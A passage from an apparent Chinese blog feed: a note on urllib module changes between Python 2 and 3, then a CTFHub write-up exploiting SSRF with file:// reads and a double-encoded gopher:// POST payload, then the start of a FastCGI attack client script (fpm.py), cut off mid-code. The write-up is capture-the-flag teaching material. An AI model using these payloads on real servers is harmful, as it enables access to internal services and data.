        <content type="html"><![CDATA[<h1 id="py2与py3中使用urllib库"><a href="#py2与py3中使用urllib库" class="headerlink" title="py2与py3中使用urllib库"></a>py2与py3中使用urllib库</h1><p>Urllib是Python提供的一个用于操作URL的模块，我们爬取网页的时候，经常需要用到这个库。</p><p>升级合并后，模块中的包的位置变化的地方较多。在此，列举一些常见的位置变动，方便之前用Python2.x的朋友在使用Python3.x的时候可以快速掌握。</p><p>常见的变化有：</p><pre><code>  在Pytho2.x中使用import urllib2-------对应的，在Python3.x中会使用import urllib.request，urllib.error。  在Pytho2.x中使用import urllib -------对应的，在Python3.x中会使用import urllib.request，urllib.error，urllib.parse。  在Pytho2.x中使用import urlparse-------对应的，在Python3.x中会使用import urllib.parse。  在Pytho2.x中使用import urlopen-------对应的，在Python3.x中会使用import urllib.request.urlopen。  在Pytho2.x中使用import urlencode-------对应的，在Python3.x中会使用import urllib.parse.urlencode。  在Pytho2.x中使用import urllib.quote-------对应的，在Python3.x中会使用import urllib.request.quote。  在Pytho2.x中使用cookielib.CookieJar-------对应的，在Python3.x中会使用http.CookieJar。  在Pytho2.x中使用urllib2.Request-------对应的，在Python3.x中会使用urllib.request.Request。</code></pre><p>  有时候会遇到一些py2的脚本，import的库跟py3不一样，可以对照上面改一下</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf使用gopher协议</title>
      <link href="/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/"/>
      <url>/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="ssrf使用gopher协议"><a href="#ssrf使用gopher协议" class="headerlink" title="ssrf使用gopher协议"></a>ssrf使用gopher协议</h1><p>前面提过了，ssrf是当我们可以利用url传参或者其它形式伪造成本地服务器向本地服务器或内网服务器发送请求的漏洞。</p><p>ctfhub中这几道ssrf题给出的环境是这样的</p><p>首先访问到题目给出的地址，啥都没有，打开hackbar来load一下url，</p><pre><code>http://challenge-f937f4ffdd5e9df4.sandbox.ctfhub.com:10080/?url=_</code></pre><p>暗示url参数为注入点</p><p>尝试注入</p><pre><code>http://challenge-f937f4ffdd5e9df4.sandbox.ctfhub.com:10080/?url=file:///var/www/html/index.php这里url参数是由它的服务器本身发起的请求，所以可以直接尝试访问服务器本地的文件</code></pre><p>访问后表面上没有什么东西，查看一下源码</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /?url=_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样拿到了index.php的源码。</p><p>重点在于<code>curl_exec($ch);</code>这句，意思是curl执行了url参数的数据，一个直接了当的ssrf漏洞</p><p>看看curl支持的协议</p><p><img src="/img/image-20210216160303276.png" alt="image-20210216160303276"></p><p>这是我本地的7.60版本的curl，支持的协议非常多，包括dict、file、ftp、gopher等，后面新版本的curl好像撤销了对一些协议的支持，包括gopher协议。不过这道题肯定是支持gopher协议的。</p><p>题目的名字是POST请求，ssrf最常使用的POST请求方式就是利用gopher协议。</p><p>这些信息可以让我们确定攻击手段，而攻击入手点还要继续查看信息。既然本地可以访问到index.php的源码，那么自然而然的可以想到查看一下本地其它文件，如flag.php。</p><p>先以http协议方式访问<code>http://challenge-f937f4ffdd5e9df4.sandbox.ctfhub.com:10080/?url=http://127.0.0.1/flag.php</code></p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/flag.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>key<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- Debug: key=8aedbe1fa89210aac9866e1b9cad9b2b--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>得到一个没有提交按钮的表单，和一个key（提交按钮可以自己修改前端代码加上去的）</p><p>再以file伪协议方式访问本地文件<code>http://challenge-f937f4ffdd5e9df4.sandbox.ctfhub.com:10080/?url=file:///var/www/html/flag.php</code></p><pre class="line-numbers language-php+HTML"><code class="language-php+HTML"><?phperror_reporting(0);if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {    echo "Just View From 127.0.0.1";    return;}$flag=getenv("CTFHUB");$key = md5($flag);if (isset($_POST["key"]) && $_POST["key"] == $key) {    echo $flag;    exit;}?><form action="/flag.php" method="post"><input type="text" name="key"><!-- Debug: key=<?php echo $key;?>-->        </form><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码审计可知，我们只需要在本地发起POST请求传一个参数key就可以得到flag了。</p><p>这里有一个点是<code>$_SERVER["REMOTE_ADDR"]</code>是“可靠”的请求端ip地址，是服务端在进行TCP握手时获得的，从技术上来说是几乎不可能伪造的，与<code>$_SERVER["HTTP_X_FORWARDED_FOR"]</code>和<code>$_SERVER["HTTP_CLIENT_IP"]</code>这两个可以通过修改http报头轻松伪造的参数不同。这也是为什么我们要使用ssrf来伪造本地服务器发起POST请求。</p><p>所以这个题的思路就是构造一个gopher请求通过url参数伪造成本地服务器向flag.php发起的请求。</p><p><img src="/img/image-20210216163144002.png" alt="image-20210216163144002"></p><p>向flag.php发送POST请求，然后用burpsuite把包抓下来</p><p><img src="/img/image-20210216164138105.png" alt="image-20210216164138105"></p><p>不需要那么多数据，只要以下几行即可</p><pre><code>POST /flag.php HTTP/1.1Host: challenge-f937f4ffdd5e9df4.sandbox.ctfhub.com:10080Content-Length: 36Content-Type: application/x-www-form-urlencodedConnection: closekey=8aedbe1fa89210aac9866e1b9cad9b2b</code></pre><p>放到hackbar里或者随便什么方式进行url编码转换一次，然后把里面所有的%0A替换成%0D%0A，再url编码转换一次。（因为url参数中的数据相当于请求了两次，所以要转换两次）</p><p>最后的payload</p><pre><code>http://challenge-f937f4ffdd5e9df4.sandbox.ctfhub.com:10080/?url=gopher://127.0.0.1:80/flag/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520challenge-f937f4ffdd5e9df4.sandbox.ctfhub.com%253A10080%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AConnection%253A%2520close%250D%250A%250D%250Akey%253D8aedbe1fa89210aac9866e1b9cad9b2b</code></pre><p><strong>记得gopher的默认端口是70，如果要发送请求到其它端口，记得修改</strong></p><p>这就是利用gopher进行ssrf的POST请求。</p><p>简化一下流程：</p><pre><code>1.侦测注入点2.找到攻击对象，如“flag.php”3.构造gopher数据（最常见的就是通过本地请求，本地抓包，然后手动或者脚本构造）4.进行攻击</code></pre><h3 id="FastCGI协议攻击"><a href="#FastCGI协议攻击" class="headerlink" title="FastCGI协议攻击"></a>FastCGI协议攻击</h3><p>关于FastCGI，下面这篇文章写得很清楚</p><p><a href="https://blog.csdn.net/mysteryflower/article/details/94386461" target="_blank" rel="noopener">https://blog.csdn.net/mysteryflower/article/details/94386461</a></p><p>文章最后那个脚本的链接需要梯子才能打开</p><p>我直接放在这里</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># fpm.py</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> random<span class="token keyword">import</span> argparse<span class="token keyword">import</span> sys<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token comment" spellcheck="true"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span>PY2 <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">.</span>major <span class="token operator">==</span> <span class="token number">2</span> <span class="token keyword">else</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">bchr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> PY2<span class="token punctuation">:</span>        <span class="token keyword">return</span> force_bytes<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> bytes<span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">bord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>c<span class="token punctuation">,</span> int<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> c    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> ord<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>s<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_text</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> issubclass<span class="token punctuation">(</span>type<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>s<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> str<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> str<span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">class</span> <span class="token class-name">FastCGIClient</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A Fast-CGI Client for Python"""</span>    <span class="token comment" spellcheck="true"># private</span>    __FCGI_VERSION <span class="token operator">=</span> <span class="token number">1</span>    __FCGI_ROLE_RESPONDER <span class="token operator">=</span> <span class="token number">1</span>    __FCGI_ROLE_AUTHORIZER <span class="token operator">=</span> <span class="token number">2</span>    __FCGI_ROLE_FILTER <span class="token operator">=</span> <span class="token number">3</span>    __FCGI_TYPE_BEGIN <span class="token operator">=</span> <span class="token number">1</span>    __FCGI_TYPE_ABORT <span class="token operator">=</span> <span class="token number">2</span>    __FCGI_TYPE_END <span class="token operator">=</span> <span class="token number">3</span>    __FCGI_TYPE_PARAMS <span class="token operator">=</span> <span class="token number">4</span>    __FCGI_TYPE_STDIN <span class="token operator">=</span> <span class="token number">5</span>    __FCGI_TYPE_STDOUT <span class="token operator">=</span> <span class="token number">6</span>    __FCGI_TYPE_STDERR <span class="token operator">=</span> <span class="token number">7</span>    __FCGI_TYPE_DATA <span class="token operator">=</span> <span class="token number">8</span>    __FCGI_TYPE_GETVALUES <span class="token operator">=</span> <span class="token number">9</span>    __FCGI_TYPE_GETVALUES_RESULT <span class="token operator">=</span> <span class="token number">10</span>    __FCGI_TYPE_UNKOWNTYPE <span class="token operator">=</span> <span class="token number">11</span>    __FCGI_HEADER_SIZE <span class="token operator">=</span> <span class="token number">8</span>    <span class="token comment" spellcheck="true"># request state</span>    FCGI_STATE_SEND <span class="token operator">=</span> <span class="token number">1</span>    FCGI_STATE_ERROR <span class="token operator">=</span> <span class="token number">2</span>    FCGI_STATE_SUCCESS <span class="token operator">=</span> <span class="token number">3</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> timeout<span class="token punctuation">,</span> keepalive<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>host <span class="token operator">=</span> host        self<span class="token punctuation">.</span>port <span class="token operator">=</span> port        self<span class="token punctuation">.</span>timeout <span class="token operator">=</span> timeout        <span class="token keyword">if</span> keepalive<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>keepalive <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>keepalive <span class="token operator">=</span> <span class="token number">0</span>        self<span class="token punctuation">.</span>sock <span class="token operator">=</span> None        self<span class="token punctuation">.</span>requests <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__connect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># if self.keepalive:</span>        <span class="token comment" spellcheck="true">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span>        <span class="token comment" spellcheck="true"># else:</span>        <span class="token comment" spellcheck="true">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span> int<span class="token punctuation">(</span>self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> msg<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>sock <span class="token operator">=</span> None            <span class="token keyword">print</span><span class="token punctuation">(</span>repr<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">__encodeFastCGIRecord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> fcgi_type<span class="token punctuation">,</span> content<span class="token punctuation">,</span> requestid<span class="token punctuation">)</span><span class="token punctuation">:</span>        length <span class="token operator">=</span> len<span class="token punctuation">(</span>content<span class="token punctuation">)</span>        buf <span class="token operator">=</span> bchr<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_VERSION<span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>fcgi_type<span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>requestid <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>requestid <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>length <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>length <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> content        <span class="token keyword">return</span> buf    <span class="token keyword">def</span> <span class="token function">__encodeNameValueParams</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        nLen <span class="token operator">=</span> len<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        vLen <span class="token operator">=</span> len<span class="token punctuation">(</span>value<span class="token punctuation">)</span>        record <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">if</span> nLen <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span>nLen<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span>nLen <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> vLen <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span>vLen<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span>vLen <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> record <span class="token operator">+</span> name <span class="token operator">+</span> value    <span class="token keyword">def</span> <span class="token function">__decodeFastCGIHeader</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>        header <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'version'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'reserved'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> header    <span class="token keyword">def</span> <span class="token function">__decodeFastCGIRecord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">:</span>        header <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span>int<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__FCGI_HEADER_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> header<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            record <span class="token operator">=</span> self<span class="token punctuation">.</span>__decodeFastCGIHeader<span class="token punctuation">(</span>header<span class="token punctuation">)</span>            record<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">''</span>            <span class="token keyword">if</span> <span class="token string">'contentLength'</span> <span class="token keyword">in</span> record<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                contentLength <span class="token operator">=</span> int<span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                record<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span>contentLength<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'paddingLength'</span> <span class="token keyword">in</span> record<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                skiped <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span>int<span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> record    <span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nameValuePairs<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> post<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token operator">not</span> self<span class="token punctuation">.</span>__connect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'connect failure! please check your fasctcgi-server !!'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        requestId <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span> <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>        request <span class="token operator">=</span> b<span class="token string">""</span>        beginFCGIRecordContent <span class="token operator">=</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_ROLE_RESPONDER<span class="token punctuation">)</span> \                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>keepalive<span class="token punctuation">)</span> \                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span>        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_BEGIN<span class="token punctuation">,</span>                                              beginFCGIRecordContent<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        paramsRecord <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">if</span> nameValuePairs<span class="token punctuation">:</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token keyword">in</span> nameValuePairs<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                name <span class="token operator">=</span> force_bytes<span class="token punctuation">(</span>name<span class="token punctuation">)</span>                value <span class="token operator">=</span> force_bytes<span class="token punctuation">(</span>value<span class="token punctuation">)</span>                paramsRecord <span class="token operator">+=</span> self<span 